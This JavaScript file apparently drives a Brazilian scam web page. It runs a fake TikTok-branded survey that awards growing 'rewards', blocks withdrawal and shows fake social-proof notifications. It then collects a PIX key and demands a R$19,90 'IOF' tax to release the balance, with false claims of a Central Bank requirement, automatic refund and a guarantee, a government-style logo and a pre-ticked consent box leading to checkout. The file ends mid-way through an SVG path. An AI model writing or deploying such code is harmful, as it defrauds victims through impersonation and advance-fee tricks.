import { surveySteps, withdrawalData } from './survey_data.js';

const app = document.getElementById('app');
let currentStepIndex = 0;
let selectedOptions = [];

// Initialize the app
function init() {
    renderStep();
}

function renderStep() {
    // Check if we have reached the end of the survey
    if (currentStepIndex >= surveySteps.length) {
        renderWithdrawal();
        return;
    }

    const step = surveySteps[currentStepIndex];
    selectedOptions = []; // Reset selection for new step

    // Determine instruction text based on step type
    const instructionText = step.type === 'radio' ? 'Selecione uma opção para continuar' : 'Selecione uma ou mais opções para continuar';

    app.innerHTML = `
        <div class="container">
            <div class="header">
                <img src="${step.logoSrc}" alt="Logo" class="logo">
                <div class="header-buttons">
                    <div class="btn-balance">${step.headerValue}</div>
                    <div class="btn-withdraw">SACAR</div>
                </div>
            </div>

            <div class="progress-container">
                <div class="progress-bar" style="width: ${step.progress}%"></div>
            </div>

            <div class="question-container">
                <div class="question-text">${step.question}</div>
                <div class="instruction-text">${instructionText}</div>
            </div>

            <div class="options-container">
                ${step.options.map(option => `
                    <div class="option-card" data-value="${option.value}">
                        <span class="option-emoji">${option.emoji}</span>
                        <span class="option-label">${option.label}</span>
                        <div class="checkbox-custom"></div>
                    </div>
                `).join('')}
            </div>

            <div class="continue-button" id="continue-btn">
                ${step.id === 11 ? 'Finalizar' : 'Continuar'}
            </div>

            <div class="bonus-container">
                <a href="#" class="bonus-button">Concorra a um bônus adicional</a>
            </div>

            <div class="footer-terms">
                <p>Ao participar das atividades de recompensa, você concorda com nossos <span>Termos</span> e <span>Condições.</span></p>
            </div>

            <div class="error-message" id="error-message">Por favor, selecione uma opção.</div>
        </div>
    `;

    // Add event listeners
    const options = document.querySelectorAll('.option-card');
    options.forEach(option => {
        option.addEventListener('click', () => handleOptionClick(option, step.type));
    });

    document.getElementById('continue-btn').addEventListener('click', () => validateAndProceed(step));

    // Handle withdraw button click to just prevent default for now or redirect
    // Handle withdraw button click to show blocked popup and start notifications
    document.querySelector('.btn-withdraw').addEventListener('click', (e) => {
        e.preventDefault();
        showWithdrawalBlockedPopup();
        startNotifications(); // Start showing social proof
    });
}

function handleOptionClick(optionElement, type) {
    const value = optionElement.dataset.value;
    const errorMessage = document.getElementById('error-message');
    errorMessage.style.display = 'none';

    // Force Radio behavior for all types as per user request
    // type = 'radio'; // Treat everything as radio logic

    // Deselect all others
    document.querySelectorAll('.option-card').forEach(el => el.classList.remove('selected'));
    // Select clicked
    optionElement.classList.add('selected');
    selectedOptions = [value];
}

let isProcessing = false;

function validateAndProceed(step) {
    const errorMessage = document.getElementById('error-message');
    const continueBtn = document.getElementById('continue-btn');

    if (selectedOptions.length === 0) {
        errorMessage.style.display = 'block';
        return;
    }

    // Prevent double clicking
    if (isProcessing) return;
    isProcessing = true;
    continueBtn.style.pointerEvents = 'none'; // Disable click
    continueBtn.style.opacity = '0.7';

    // Success
    confetti({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 }
    });

    setTimeout(() => {
        showPopup(step);
        // Reset processing state when popup handles the next step
        // Ideally reset this locally if needed, but since showPopup creates a new flow overlay,
        // we can reset it inside the popup continue or just here if we want button to stay disabled until popup action.
        // Actually, we should probably keep it disabled until the next step renders.
        // But since renderStep() recreates the DOM for the next step, 'isProcessing' needs to be potentially global or reset.
        isProcessing = false;
    }, 400);
}

function showPopup(step) {
    const popup = document.createElement('div');
    popup.className = 'popup-overlay';
    popup.innerHTML = `
        <div class="popup-content">
            <div class="popup-header">
                <h3 class="popup-title">Nova recompensa</h3>
            </div>
            <div class="popup-body">
                <div class="popup-subtitle">Você ganhou</div>
                <div class="popup-reward">R$ <span id="reward-counter">0.00</span></div>
                <div class="popup-message">Responda mais pesquisas para ganhar até R$850</div>
                <div class="popup-button" id="popup-continue-btn">Continuar recebendo</div>
            </div>
        </div>
    `;

    document.body.appendChild(popup);

    // Animate counter
    animateCounter(document.getElementById('reward-counter'), 0, step.reward, 800);

    document.getElementById('popup-continue-btn').addEventListener('click', () => {
        document.body.removeChild(popup);
        currentStepIndex++;
        renderStep();
    });
}

function animateCounter(element, start, end, duration) {
    let startTimestamp = null;
    const step = (timestamp) => {
        if (!startTimestamp) startTimestamp = timestamp;
        const progress = Math.min((timestamp - startTimestamp) / duration, 1);
        const easeOutQuart = 1 - Math.pow(1 - progress, 4);
        const currentValue = start + (end - start) * easeOutQuart;
        element.textContent = currentValue.toFixed(2);
        if (progress < 1) {
            window.requestAnimationFrame(step);
        }
    };
    window.requestAnimationFrame(step);
}

// This function now consolidates Amount Selection and PIX Input into one page
function renderWithdrawal() {
    window.scrollTo(0, 0);
    app.innerHTML = `
        <div class="container withdrawal-container redesign" style="background-color: #F5F7FA; padding: 20px; font-family: 'Inter', sans-serif;">
            
            <!-- Header -->
            <div class="withdrawal-header-redesign">
                <img src="./images/B5GlvwlzGgY4.svg" alt="Back" class="icon-back" style="width: 24px; cursor: pointer;" onclick="location.reload()">
                <div class="withdrawal-title-redesign">Resgatar recompensas</div>
                <img src="./images/witqoPzRTivz.svg" alt="Help" class="icon-help" style="width: 24px;">
            </div>

            <!-- Balance Card (Restored) -->
            <div class="balance-card-container">
                <div class="balance-card-top">
                    <div class="balance-info">
                        <div class="balance-title-text">Seu saldo</div>
                        <div class="balance-amount-text">R$ <span id="final-balance-2">0.00</span></div>
                    </div>
                    <div class="balance-icon-container">
                        <img src="./images/fZzWGgSRhuQm.png" alt="Coin">
                    </div>
                </div>
                <div class="balance-card-bottom">
                    <div class="last-rewards-text">Últimas recompensas: R$ 54,87</div>
                </div>
            </div>

            <!-- Sacar Dinheiro Section Header -->
            <div style="margin-bottom: 20px; margin-top: 20px;">
                <h1 style="font-size: 24px; font-weight: 800; color: #000; margin: 0 0 15px 0; text-align: left;">Sacar dinheiro</h1>
                
                <div style="display: flex; align-items: center; gap: 8px;">
                     <i class="fas fa-university" style="color: #666; font-size: 16px;"></i>
                     <span style="font-size: 15px; font-weight: 500; color: #000;">Transferência bancária / </span>
                     <i class="fas fa-clock" style="color: #20D59E; font-size: 14px;"></i> <!-- Using a clock or similar icon for the green diamond generic -->
                </div>
            </div>

            <!-- Amount Options -->
            <div style="display: flex; gap: 6px; margin-bottom: 25px; flex-wrap: wrap;">
                <div class="amount-pill" data-amount="1.50">R$1.5</div>
                <div class="amount-pill" data-amount="5.00">R$5</div>
                <div class="amount-pill" data-amount="10.00">R$10</div>
                <div class="amount-pill selected" data-amount="${withdrawalData.finalBalance}">R$${withdrawalData.finalBalance.toFixed(2)}</div>
            </div>

            <!-- Custom Select Dropdown -->
            <div class="custom-select-container" style="position: relative; margin-bottom: 15px;">
                <div id="custom-select-trigger" style="
                    background: #fff;
                    border: 1px solid #ccc;
                    border-radius: 8px;
                    padding: 16px;
                    font-size: 15px;
                    color: #333;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    cursor: pointer;
                    font-weight: 500;
                ">
                    <span id="selected-type-text">Selecione o tipo de chave:</span>
                    <i class="fas fa-chevron-down" style="font-size: 12px; color: #777;"></i>
                </div>
                
                <div id="custom-select-options" style="
                    display: none;
                    position: absolute;
                    top: 100%;
                    left: 0;
                    width: 100%;
                    background: #fff;
                    border: 1px solid #ccc;
                    border-radius: 8px;
                    margin-top: 5px;
                    z-index: 100;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                    overflow: hidden;
                ">
                    <div class="custom-option" data-value="cpf">CPF</div>
                    <div class="custom-option" data-value="email">E-mail</div>
                    <div class="custom-option" data-value="telefone">Telefone</div>
                    <div class="custom-option" data-value="random">Chave Aleatória</div>
                </div>
            </div>

            <!-- PIX Input -->
            <input type="text" id="pix-key-input" placeholder="Digite a sua chave PIX" style="
                width: 100%;
                padding: 16px;
                border: 1px solid #ccc;
                border-radius: 8px;
                font-size: 15px;
                background: #fff;
                box-sizing: border-box;
                margin-bottom: 30px;
                outline: none;
                font-family: 'Inter', sans-serif;
            ">

            <!-- CTA Button -->
            <div id="realizar-saque-btn" style="
                background-color: #FF4906;
                color: #fff;
                width: 100%;
                padding: 16px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 700;
                text-transform: uppercase;
                cursor: pointer;
                box-shadow: 0 4px 10px rgba(255, 73, 6, 0.3);
                transition: transform 0.1s;
                box-sizing: border-box;
            ">
                REALIZAR SAQUE
            </div>

            <!-- Footer Text -->
            <div style="margin-top: 30px; text-align: center; color: #777; font-size: 12px; line-height: 1.5;">
                Para sacar o seu dinheiro, você precisa de um saldo mínimo de R$ 1,50. Os limites de saque para transações individuais e mensais podem variar conforme o país ou a região.
            </div>

            <div style="margin-top: 30px; text-align: center;">
                 <h3 style="font-size: 18px; font-weight: 800; margin: 0 0 10px 0;">Como retirar o dinheiro?</h3>
                 <p style="font-size: 14px; margin: 0; color: #000;">Insira sua chave PIX, escolha o valor e clique em 'Sacar' dinheiro.</p>
            </div>

             <!-- Terms Footer -->
            <div class="footer-terms-redesign" style="margin-top: 40px; border-top: none; background: transparent;">
                <p class="footer-terms-text">Ao continuar, você concorda com os <span style="color: #000; font-weight: 700;">Termos e Condições</span> do TikTok. Os pagamentos são processados pela PIPO. <span style="color: #000; font-weight: 700;">Consulte Politica de privacidade da Pipo.</span></p>
            </div>


        </div>
    `;

    // --- Styling for dynamic elements ---
    const style = document.createElement('style');
    style.innerHTML = `
        .amount-pill {
            background: #F0F0F0;
            border: 1px solid #E0E0E0;
            border-radius: 8px;
            padding: 10px 12px;
            font-weight: 700;
            font-size: 14px;
            color: #555;
            cursor: pointer;
            white-space: nowrap;
            flex: 1;
            text-align: center;
            min-width: 0;
        }
        .amount-pill.selected {
            background: #FFEBE5; /* Light Orange */
            border: 1px solid #FF4906;
            color: #FF4906;
        }
        .custom-option {
            padding: 12px 16px;
            cursor: pointer;
            transition: background 0.2s;
            color: #333;
            font-weight: 500;
            text-align: left; /* Align text to left */
        }
        .custom-option:hover {
            background-color: #f5f5f5;
        }
        #realizar-saque-btn {
            box-sizing: border-box; /* Fix width overflow */
        }
        ::placeholder {
            color: #999;
        }
    `;
    document.head.appendChild(style);

    // Animate Balance (Restored)
    animateCounter(document.getElementById('final-balance-2'), 0, withdrawalData.finalBalance, 2000); // 2000ms duration matching others

    // --- Logic ---

    // Amount Selection
    document.querySelectorAll('.amount-pill').forEach(pill => {
        pill.addEventListener('click', () => {
            document.querySelectorAll('.amount-pill').forEach(p => p.classList.remove('selected'));
            pill.classList.add('selected');
        });
    });

    // Custom Dropdown Logic
    const trigger = document.getElementById('custom-select-trigger');
    const optionsMenu = document.getElementById('custom-select-options');
    const selectedText = document.getElementById('selected-type-text');
    let isDropdownOpen = false;

    trigger.addEventListener('click', (e) => {
        e.stopPropagation();
        isDropdownOpen = !isDropdownOpen;
        optionsMenu.style.display = isDropdownOpen ? 'block' : 'none';
        trigger.style.borderColor = isDropdownOpen ? '#FF4906' : '#ccc';
    });

    document.querySelectorAll('.custom-option').forEach(opt => {
        opt.addEventListener('click', () => {
            selectedText.textContent = opt.textContent;
            selectedText.style.color = "#000";

            // Updates trigger with Checkmark + Text (Left) and Chevron (Right)
            trigger.innerHTML = `
                <div style="display: flex; align-items: center; gap: 8px;">
                    <i class="fas fa-check" style="color: #aaa;"></i>
                    <span>${opt.textContent}</span>
                </div>
                <i class="fas fa-chevron-down" style="font-size: 12px; color: #777;"></i>
            `;

            isDropdownOpen = false;
            optionsMenu.style.display = 'none';
            trigger.style.borderColor = '#ccc';
        });
    });

    // Close dropdown on outside click
    document.addEventListener('click', () => {
        if (isDropdownOpen) {
            isDropdownOpen = false;
            optionsMenu.style.display = 'none';
            trigger.style.borderColor = '#ccc';
        }
    });

    // CTA Click
    document.getElementById('realizar-saque-btn').addEventListener('click', () => {
        const pixKey = document.getElementById('pix-key-input').value;
        const selectedType = selectedText.textContent;

        if (!pixKey || selectedType.includes("Selecione")) {
            Swal.fire({
                icon: 'warning',
                title: 'Atenção',
                text: 'Por favor, selecione o tipo de chave e digite sua chave PIX.',
                confirmButtonColor: '#FF4906'
            });
            return;
        }

        // Proceed directly to IOF (Skipping Animation Page as requested)
        renderIOF();
    });

    // Continue Notification flow if not already running (it persists via body, but good to ensure)
    startNotifications();
}

// This function corresponds to the Saque1 page (Amount Selection)
// function renderSaque1() Removed as it is now consolidated into renderWithdrawal

// renderAnimation function removed as per user request to skip it.

function renderIOF() {
    stopNotifications(); // Stop notifications on this page as requested
    window.scrollTo(0, 0);
    // Apply background color to body for full page consistency if needed, but container has styles
    document.body.style.backgroundColor = "#F5F7FA";

    app.innerHTML = `
<div class="container iof-container" id="iof-content" style="
            max-width: 480px; 
            margin: 20px auto; 
            background: #fff; 
            padding: 30px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
            font-family: 'Manrope', sans-serif;
            border: 1px solid rgba(0,0,0,0.05);
        ">

    <!-- Logo Header (Centered for Brand Identity) -->
    <div style="display: flex; justify-content: center; margin-bottom: 8px;">
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="24" viewBox="0 0 160 37" fill="none">
            <path
                d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z"
                fill="#003772" />
            <path
                d="M58.5178 24.9289H61.4481V19.8993C62.4977 19.8993 62.8913 19.8993 63.3724 21.605L64.3346 24.9289H67.3961L66.1277 20.8615C65.6467 19.3745 65.2968 18.8934 64.3783 18.7622C66.7838 18.2374 66.8712 16.1819 66.8712 15.657C66.8712 13.3391 65.1218 12.4644 63.0663 12.4644H58.5178V24.9289ZM61.3169 14.5636H62.1916C63.766 14.5636 63.941 15.6133 63.941 16.1381C63.941 17.0128 63.3724 17.8001 62.2353 17.8001H61.3169V14.5636ZM81.9162 22.9608C81.4351 23.1358 80.954 23.092 80.3854 23.092C79.3795 23.092 78.2424 22.5235 78.2424 20.6866C78.2424 20.3367 78.2424 18.1499 80.2542 18.1499C80.8228 18.1499 81.2164 18.1499 81.785 18.2374L81.9162 16.2693C81.0415 16.1818 80.6916 16.1381 79.8169 16.1381C77.0616 16.1381 75.5308 18.0187 75.5308 20.6866C75.5308 22.261 76.2743 25.0601 79.5982 25.0601C80.4292 25.0601 81.2164 25.1476 81.9599 24.9289L81.9162 22.9608ZM90.3571 14.7823H92.9812V12.4644H90.3571V14.7823ZM134.486 12.4644H131.862V17.5376C131.512 16.7504 130.812 16.1381 129.588 16.1381C127.401 16.1381 126.526 18.0625 126.526 20.3804C126.526 23.1358 127.619 25.0601 129.588 25.0601C131.075 25.0601 131.687 24.0979 131.949 23.5294C131.993 24.1417 132.037 24.579 132.037 24.9289H134.53C134.486 24.5353 134.486 24.0979 134.486 23.0045V12.4644ZM129.325 20.5991C129.325 19.2433 129.413 17.9313 130.593 17.9313C131.643 17.9313 131.906 19.2433 131.906 20.5991C131.906 21.605 131.687 23.1795 130.593 23.1795C129.369 23.1795 129.325 21.5176 129.325 20.5991ZM143.408 24.9289H146.032V21.0802C146.032 19.8119 146.207 18.4998 147.738 18.4998H148.612V16.3131H148.219C146.688 16.3131 146.338 16.9254 145.813 17.8875C145.77 17.3627 145.726 16.8379 145.726 16.3131H143.32C143.364 16.7504 143.364 17.2752 143.364 18.1062V24.9289H143.408ZM157.01 24.9289H159.634V12.4644H157.01V24.9289ZM111.437 24.9289H114.237V19.7244H118.173V17.5376H114.237V14.6511H118.304V12.4644H111.394V24.9289H111.437ZM149.312 18.4561C150.362 18.0187 151.149 17.9313 151.805 17.9313C152.199 17.9313 153.423 17.8438 153.423 19.5057H152.636C151.718 19.5057 148.35 19.5057 148.35 22.436C148.35 24.0105 149.4 25.0601 151.018 25.0601C152.242 25.0601 153.292 24.2729 153.38 23.748L153.467 24.9289H155.872C155.829 24.3603 155.829 23.748 155.829 22.4797V19.3308C155.829 17.4064 155.129 16.1381 152.067 16.1381C151.105 16.1381 150.187 16.2693 149.312 16.2693V18.4561ZM153.423 21.2551C153.423 23.3544 152.111 23.3982 151.849 23.3982C151.63 23.3982 150.712 23.3982 150.712 22.2611C150.712 20.8178 152.374 20.7303 153.423 20.7303V21.2551ZM69.8452 19.8556C69.8452 19.3745 69.8452 17.7126 71.201 17.7126C72.2944 17.7126 72.5568 18.7622 72.5568 19.8556H69.8452ZM74.9185 20.6428C74.9185 16.1381 71.9445 16.1381 71.1573 16.1381C68.6644 16.1381 67.3086 18.2374 67.3086 20.5554C67.3086 23.1795 68.6644 25.0601 71.6821 25.0601C72.5568 25.0601 73.5627 25.1038 74.4374 24.9289L74.3937 22.9608C73.519 23.267 72.863 23.267 71.9445 23.267C70.4575 23.267 69.8015 22.3048 69.8015 21.2989H74.9185V20.6428ZM84.5403 19.8556C84.5403 19.3745 84.5403 17.7126 85.8961 17.7126C86.9895 17.7126 87.2519 18.7622 87.2519 19.8556H84.5403ZM89.6136 20.6428C89.6136 16.1381 86.6396 16.1381 85.8523 16.1381C83.3594 16.1381 82.0036 18.2374 82.0036 20.5554C82.0036 23.1795 83.3594 25.0601 86.3772 25.0601C87.2956 25.0601 88.2578 25.1038 89.1325 24.9289L89.0888 22.9608C88.214 23.267 87.558 23.267 86.6396 23.267C85.1526 23.267 84.4966 22.3048 84.4966 21.2989H89.6136V20.6428ZM120.928 19.8556C120.928 19.3745 120.928 17.7126 122.284 17.7126C123.377 17.7126 123.64 18.7622 123.64 19.8556H120.928ZM126.045 20.6428C126.045 16.1381 123.071 16.1381 122.284 16.1381C119.791 16.1381 118.435 18.2374 118.435 20.5554C118.435 23.1795 119.791 25.0601 122.809 25.0601C123.683 25.0601 124.689 25.1038 125.564 24.9289L125.52 22.9608C124.645 23.267 123.989 23.267 123.071 23.267C121.584 23.267 120.928 22.3048 120.928 21.2989H126.045V20.6428ZM137.635 19.8556C137.635 19.3745 137.635 17.7126 138.991 17.7126C140.084 17.7126 140.346 18.7622 140.346 19.8556H137.635ZM142.752 20.6428C142.752 16.1381 139.778 16.1381 138.991 16.1381C136.498 16.1381 135.142 18.2374 135.142 20.5554C135.142 23.1795 136.498 25.0601 139.515 25.0601C140.434 25.0601 141.396 25.1038 142.271 24.9289L142.227 22.9608C141.352 23.267 140.696 23.267 139.778 23.267C138.291 23.267 137.635 22.3048 137.635 21.2989H142.752V20.6428ZM100.547 18.4561C101.597 18.0187 102.384 17.9313 103.04 17.9313C103.434 17.9313 104.658 17.8438 104.658 19.5057H103.871C102.953 19.5057 99.5852 19.5057 99.5852 22.436C99.5852 24.0105 100.635 25.0601 102.253 25.0601C103.521 25.0601 104.527 24.2729 104.615 23.748L104.702 24.9289H107.108C107.064 24.3603 107.02 23.748 107.02 22.4797V19.3308C107.02 17.4064 106.32 16.1381 103.303 16.1381C102.341 16.1381 101.422 16.2693 100.547 16.2693V18.4561ZM104.658 21.2551C104.658 23.3544 103.346 23.3982 103.084 23.3982C102.865 23.3982 101.947 23.3982 101.947 22.2611C101.947 20.8178 103.609 20.7303 104.615 20.7303V21.2551H104.658ZM90.3571 24.9289V16.2693H94.9055V14.4762L97.4859 13.6452V16.2256H99.1916V18.0625H97.4859V22.0424C97.4859 22.8733 97.8795 23.1358 98.3606 23.1358C98.7105 23.1358 98.9729 23.0483 99.2353 22.9608V24.8852C98.9729 24.9726 98.2731 25.0164 97.3984 25.0164C96.0427 25.0164 94.8618 24.3603 94.8618 22.4797V18.1062H93.0249V24.9289H90.3571Z"
                fill="#003772" />
        </svg>
    </div>

    <!-- Warning Icon (Left Aligned as requested) -->
    <div style="display: flex; justify-content: flex-start; margin-bottom: 5px;">
        <svg aria-hidden="true" style="width: 20px; height: 20px; fill: #EBC818;" viewBox="0 0 576 512"
            xmlns="http://www.w3.org/2000/svg">
            <path
                d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z" />
        </svg>
    </div>

    <h2
        style="font-family: 'Manrope', sans-serif; font-size: 16px; font-weight: 700; text-align: left; margin: 0 0 5px 0; color: #000;">
        IOF - Imposto Obrigatório
    </h2>

    <!-- Main Title Left Aligned -->
    <h2
        style="font-family: 'Manrope', sans-serif; font-size: 17px; font-weight: 600; text-align: left; margin: 0 0 8px 0; color: #111; line-height: 1.2;">
        Pague o IOF para Liberar seu Saldo
    </h2>

    <p
        style="font-family: 'Manrope', sans-serif; font-size: 14px; font-weight: 400; text-align: left; margin: 0 0 8px 0; color: #333; line-height: 1.4;">
        Valor acumulado: <strong>R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')}</strong> • IOF: <strong>R$19,90</strong>
    </p>

    <p
        style="font-family: 'Manrope', sans-serif; font-size: 12px; font-weight: 400; text-align: left; margin: 0 0 10px 0; color: #666; line-height: 1.3; border-left: 2px solid #ff4906; padding-left: 10px;">
        <span style="color: #FF0000; font-weight: bold;">*</span> Exigência do Banco Central (Lei 8.894/94). Valor reembolsado automaticamente.
    </p>

    <!-- Summary Card with Shadow -->
    <div class="iof-summary-card" style="
                background: linear-gradient(to bottom, #ffffff, #fafafa);
                box-shadow: 0 5px 15px rgba(0,0,0,0.08); 
                padding: 15px; 
                border-radius: 12px; 
                border: 1px solid #eee;
                margin-bottom: 12px;
            ">
        <h2
            style="font-family: 'Manrope', sans-serif; font-size: 16px; font-weight: 800; margin: 0 0 10px 0; text-align: left;">
            Resumo</h2>
        <div style="height: 1px; background-color: #eee; margin-bottom: 10px;"></div>

        <div class="summary-row" style="display: flex; justify-content: space-between; margin-bottom: 10px;">
            <span style="font-family: 'Manrope', sans-serif; font-weight: 600; color: #555;">Valor ganho</span>
            <span
                style="font-family: 'Manrope', sans-serif; font-weight: 700; color: #000;">R$${withdrawalData.finalBalance.toFixed(2).replace('.',
        ',')}</span>
        </div>

        <div style="height: 1px; background-color: #eee; margin-bottom: 10px;"></div>

        <div class="summary-row" style="display: flex; justify-content: space-between; margin-bottom: 6px;">
            <span style="font-family: 'Manrope', sans-serif; font-weight: 600; color: #555;">Valor à pagar (IOF)</span>
            <span style="font-family: 'Manrope', sans-serif; font-weight: 700; color: #DC3545;">- R$19,90</span>
        </div>
        <div
            style="font-size: 11px; color: #888; margin-bottom: 12px; font-family: 'Manrope', sans-serif; text-align: left;">
            *(Reembolsado após Aprovação da Conta e Liberação do Saque)</div>

        <div style="height: 1px; background-color: #eee; margin-bottom: 12px;"></div>

        <div class="summary-row total" style="display: flex; justify-content: space-between; margin-bottom: 0;">
            <span style="font-family: 'Manrope', sans-serif; font-weight: 800; font-size: 18px; color: #000;">Total a
                receber no PIX</span>
            <span
                style="font-family: 'Manrope', sans-serif; font-weight: 800; font-size: 18px; color: #28a745;">R$${withdrawalData.finalBalance.toFixed(2).replace('.',
            ',')}</span>
        </div>

        <div
            style="display: flex; gap: 10px; margin-top: 12px; align-items: start; background: #f0fdf4; padding: 10px; border-radius: 8px; border: 1px dashed #28a745;">
            <svg aria-hidden="true" style="width: 18px; height: 18px; color: #28a745; flex-shrink: 0; margin-top: 2px;"
                viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                <path
                    d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"
                    fill="currentColor"></path>
            </svg>
            <div
                style="font-size: 12px; font-weight: 600; color: #155724; line-height: 1.4; font-family: 'Manrope', sans-serif; text-align: left;">
                Pagamento processado via PIX imediatamente após confirmação.
            </div>
        </div>
    </div>

    <!-- Top Payment Section (Added for "Above Fold" Request) -->
    <div class="checkbox-container" style="display: flex; align-items: start; gap: 12px; margin-top: 15px; justify-content: flex-start; background: #f8f9fa; padding: 10px; border-radius: 8px;">
        <input type="checkbox" id="termsCheckbox-top" checked="" style="margin-top: 3px; transform: scale(1.2);">
        <label for="termsCheckbox-top" style="font-family: 'Inter', sans-serif; font-size: 13px; color: #333; line-height: 1.4; text-align: left; cursor: pointer;">
            Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), no valor de <strong>R$19,90</strong>.
        </label>
    </div>
    
    <a id="paymentButton-top" href="javascript:void(0)" onclick="if(document.getElementById('termsCheckbox-top').checked){ window.location.href = typeof addUtm === 'function' ? addUtm('checkout/index.html') : 'checkout/index.html' + window.location.search; }" class="btn33 enabled" style="
        margin-top: 15px; 
        background-color: #003772; 
        color: white; 
        border-radius: 50px; 
        box-shadow: 0 4px 6px rgba(0, 55, 114, 0.3);
        font-weight: 700;
        letter-spacing: 0.5px;
        margin-bottom: 25px;
        cursor: pointer;
        display: flex;
        justify-content: center;
        align-items: center;
        text-decoration: none;
        height: 50px;
    ">Pagar Imposto</a>

    <!-- Guarantee Section (Left Aligned) -->
    <div style="
                border: 1px solid #e0e0e0; 
                border-radius: 12px;
                padding: 20px; 
                margin-top: 30px; 
                display: flex; 
                align-items: center; 
                gap: 20px;
                box-shadow: 0 4px 10px rgba(0,0,0,0.03);
            ">
        <svg aria-hidden="true" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"
            style="width: 48px; height: 48px; fill: #28a745; flex-shrink: 0;">
            <path
                d="M256 8C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 48c110.532 0 200 89.451 200 200 0 110.532-89.451 200-200 200-110.532 0-200-89.451-200-200 0-110.532 89.451-200 200-200m140.204 130.267l-22.536-22.718c-4.667-4.705-12.265-4.736-16.97-.068L215.346 303.697l-59.792-60.277c-4.667-4.705-12.265-4.736-16.97-.069l-22.719 22.536c-4.705 4.667-4.736 12.265-.068 16.971l90.781 91.516c4.667 4.705 12.265 4.736 16.97.068l172.589-171.204c4.704-4.668 4.734-12.266.067-16.971z">
            </path>
        </svg>
        <div style="text-align: left;">
            <h2
                style="font-family: 'Manrope', sans-serif; font-size: 18px; font-weight: 700; margin: 0 0 5px 0; color: #111;">
                Garantia de recebimento</h2>
            <p style="font-family: 'Manrope', sans-serif; font-size: 13px; margin: 0; color: #666; line-height: 1.5;">
                Regulamentado pelo Banco Central. Garantimos que o valor será creditado.</p>
        </div>
    </div>

    <!-- Payment Method Section -->
    <div style="margin-top: 35px;">
        <h2
            style="font-family: 'Manrope', sans-serif; font-size: 18px; font-weight: 700; margin: 0 0 15px 0; text-align: left;">
            Método de pagamento</h2>

        <div style="
                    background-color: #ffffff; 
                    border: 1px solid #e0e0e0; 
                    border-radius: 12px; 
                    padding: 20px; 
                    display: flex; 
                    flex-direction: column;
                    align-items: flex-start; 
                    margin-bottom: 20px;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.03);
                ">
            <div style="width: 100%; display: flex; justify-content: flex-start; margin-bottom: 15px;">
                <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="-1.165 -.17395293 238.183 85.60195293"
                    width="70">
                    <path
                        d="m97.827 78.68v-48.324c0-8.892 7.208-16.1 16.1-16.1l14.268.022c8.865.018 16.043 7.21 16.043 16.076v10.286c0 8.891-7.208 16.1-16.1 16.1h-20.161m40.248-42.49h6.19a6.607 6.607 0 0 1 6.606 6.607v36.099"
                        style="fill:none;stroke:#939598;stroke-width:2.976;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10">
                    </path>
                    <path
                        d="m159.695 8.657-2.807-2.807a1.783 1.783 0 0 1 0-2.522l2.805-2.805a1.786 1.786 0 0 1 2.525 0l2.805 2.805a1.783 1.783 0 0 1 0 2.522l-2.806 2.807a1.783 1.783 0 0 1 -2.522 0"
                        fill="#32bcad"></path>
                    <path
                        d="m172.895 14.218h6.138c3.158 0 6.186 1.254 8.419 3.487l14.356 14.356a4.762 4.762 0 0 0 6.735 0l14.304-14.304a11.906 11.906 0 0 1 8.418-3.487h4.99m-63.36 42.37h6.138c3.158 0 6.186-1.255 8.419-3.487l14.356-14.357a4.762 4.762 0 0 1 6.735 0l14.304 14.304a11.906 11.906 0 0 0 8.418 3.487h4.99"
                        style="fill:none;stroke:#939598;stroke-width:2.976;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10">
                    </path>
                    <path
